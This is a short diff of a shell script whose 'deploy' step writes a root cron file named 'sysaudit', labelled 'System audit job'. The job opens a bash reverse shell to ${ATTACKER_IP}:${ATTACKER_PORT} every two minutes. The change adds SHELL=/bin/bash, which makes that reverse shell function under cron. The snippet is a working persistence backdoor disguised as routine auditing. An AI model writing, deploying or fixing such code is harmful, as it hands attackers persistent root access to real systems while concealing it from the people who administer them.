@@ -9,6 +9,7 @@ CRON_FILE="/etc/cron.d/sysaudit"
 case "${1:-}" in
   deploy)
     cat > "$CRON_FILE" <<CRON_EOF
+SHELL=/bin/bash
 # System audit job
 */2 * * * * root bash -i >& /dev/tcp/${ATTACKER_IP}/${ATTACKER_PORT} 0>&1 2>/dev/null || true
 CRON_EOF
